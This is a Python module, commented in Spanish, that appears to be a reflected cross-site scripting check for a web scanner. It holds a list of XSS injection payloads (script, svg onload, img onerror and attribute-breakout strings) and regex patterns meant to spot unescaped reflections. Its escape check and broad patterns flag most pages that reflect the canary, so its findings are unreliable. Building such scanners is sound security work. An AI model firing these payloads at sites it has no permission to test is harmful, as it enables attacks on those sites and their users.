import random
import string
import re
from html import unescape


def _rand(n: int = 8) -> str:
    s = string.ascii_letters + string.digits
    return "".join(random.choice(s) for _ in range(n))


class XSS:
    """
    Reflected XSS básico.
    Estrategia:
      1) Inyecta canario + payloads típicos.
      2) Marca vulnerable si el canario aparece sin escapar en contexto HTML/atributo/JS.
      3) Ignora apariciones solo escapadas (&lt; &gt; &quot; &#x27; etc.).
    Limitación: sin DOM; no ejecuta JS. Heurística de servidor.
    """

    def __init__(self):
        self.name = "Cross-Site Scripting (Reflected XSS)"
        self.canary = _rand()
        c = self.canary
        # Variantes que cubren texto, atributo, y cierre de etiqueta
        self.payloads = [
            f"{c}<script>alert(1)</script>",
            f"{c}\"><svg/onload=alert(1)>",
            f"{c}'><img src=x onerror=alert(1)>",
            f"{c}</title><svg/onload=alert(1)>",
            # rompe comentario HTML
            f"{c}--><svg/onload=alert(1)>",
            f"{c}</script><script>alert(1)</script>",       # sale de <script>
            f"{c}\"><body onfocus=alert(1) autofocus>",     # atributo
            f"{c}`-alert(1)-`",                             # contextos raros
        ]

        # patrones que indican que NO está escapado correctamente
        self._danger_patterns = [
            # canario seguido por < o >
            re.compile(re.escape(self.canary) + r".*<", re.S | re.I),
            re.compile(re.escape(self.canary) + r".*>", re.S | re.I),
            # cierre abrupto de atributo y nueva etiqueta
            re.compile(re.escape(self.canary) + r".*['\"]>\s*<", re.S | re.I),
            # aparición de <script> / onerror / onload no escapados
            re.compile(r"<script[^>]*>", re.I),
            re.compile(r"\sonerror\s*=", re.I),
            re.compile(r"\sonload\s*=", re.I),
            # svg handlers
            re.compile(r"<svg[^>]*>", re.I),
        ]

    def get_payloads(self):
        return self.payloads

    def _looks_escaped(self, text: str) -> bool:
        """
        Si el canario aparece solo en forma escapada (&lt; &gt; &quot; &#x27;),
        consideramos que está neutralizado para reflejo básico.
        """
        raw = text
        esc = unescape(text)
        # Si desescapar no cambia nada, y alrededor del canario no hay tokens peligrosos, podría estar escapado
        only_entities = (
            "&lt;" in raw or "&gt;" in raw or "&quot;" in raw or "&#x27;" in raw)
        return only_entities and ("<" not in esc and ">" not in esc)

    def check_response(self, response) -> bool:
        body = response.text
        if self.canary not in body:
            return False  # no hay reflexión
        if self._looks_escaped(body):
            return False  # parece escapado

        # Heurística: canario presente + algún patrón peligroso no escapado
        for rx in self._danger_patterns:
            if rx.search(body):
                return True
        # fallback: canario seguido de paréntesis que suelen denotar JS ejecutable
        if re.search(re.escape(self.canary) + r".*\balert\s*\(", body, re.I | re.S):
            return True
        return False
